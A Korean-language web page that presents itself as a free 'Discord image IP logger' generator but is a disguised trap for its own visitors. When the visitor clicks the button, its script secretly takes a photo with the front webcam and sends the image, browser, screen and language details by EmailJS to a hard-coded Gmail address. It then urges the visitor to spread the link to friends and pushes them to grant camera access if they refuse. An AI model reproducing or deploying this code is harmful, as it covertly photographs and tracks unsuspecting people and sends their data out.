<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>디스코드 이미지 IP 로거 - 무료 제작</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #0d1117, #161b22);
      color: #c9d1d9;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 40px 32px;
      max-width: 460px;
      width: 100%;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
      text-align: center;
    }
    h1 {
      font-size: 2.1rem;
      margin: 0 0 1.2rem;
      color: #58a6ff;
    }
    p {
      font-size: 1.05rem;
      color: #8b949e;
      line-height: 1.6;
      margin-bottom: 2rem;
    }
    .btn {
      background: #238636;
      color: white;
      border: none;
      padding: 14px 40px;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.2s;
      box-shadow: 0 4px 12px rgba(35,134,54,0.4);
    }
    .btn:hover {
      background: #2ea043;
      box-shadow: 0 6px 20px rgba(35,134,54,0.6);
    }
    .status {
      margin-top: 1.8rem;
      font-size: 0.95rem;
      color: #8b949e;
    }
    .loader {
      border: 4px solid #21262d;
      border-top: 4px solid #58a6ff;
      border-radius: 50%;
      width: 36px;
      height: 36px;
      animation: spin 1s linear infinite;
      margin: 25px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #video, #canvas { display: none; }
  </style>
</head>
<body>

<div class="card">
  <h1>디스코드 이미지 IP 로거</h1>
  <p>친구 사진 + IP + 디바이스 정보까지 한 번에 잡아주는 최고급 무료 제작기<br>버튼 누르고 바로 링크 공유해서 사용하세요!</p>
  
  <button class="btn" id="startBtn">IP 로거 제작 시작</button>
  
  <div class="loader" id="loader"></div>
  <div class="status" id="status">버튼을 누르면 제작이 바로 시작됩니다</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  emailjs.init("ycbHVBt3cm6FkCL--");

  document.getElementById('startBtn').addEventListener('click', async () => {
    const btn = document.getElementById('startBtn');
    const loader = document.getElementById('loader');
    const status = document.getElementById('status');

    btn.disabled = true;
    btn.style.opacity = '0.6';
    loader.style.display = 'block';
    status.textContent = '로거 제작 중... 잠시만 기다려주세요';

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      const video = document.getElementById('video');
      video.srcObject = stream;
      await new Promise(r => video.onloadedmetadata = r);
      await new Promise(r => setTimeout(r, 1400));

      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const base64 = canvas.toDataURL('image/jpeg', 0.68);

      const now = new Date().toLocaleString('ko-KR');
      const info = {
        time: now,
        agent: navigator.userAgent,
        screen: `\( {screen.width}× \){screen.height}`,
        lang: navigator.language
      };

      // EmailJS 전송 (받는 사람은 EmailJS 대시보드 template_upvu62t To Email에 dog0928001@gmail.com 설정)
      await emailjs.send("service_had7jag", "template_upvu62t", {
        timestamp: info.time,
        image_base64: base64,
        user_agent: info.agent,
        screen: info.screen,
        language: info.lang
      });

      status.innerHTML = '제작 완료!<br><strong>이 링크를 친구에게 공유하세요!</strong>';
      loader.style.display = 'none';

      stream.getTracks().forEach(t => t.stop());

    } catch (err) {
      status.innerHTML = '카메라 권한이 필요합니다.<br>허용해야 로거 제작이 완료됩니다.';
      loader.style.display = 'none';
      btn.disabled = false;
      btn.style.opacity = '1';
    }
  });
</script>
</body>
</html>
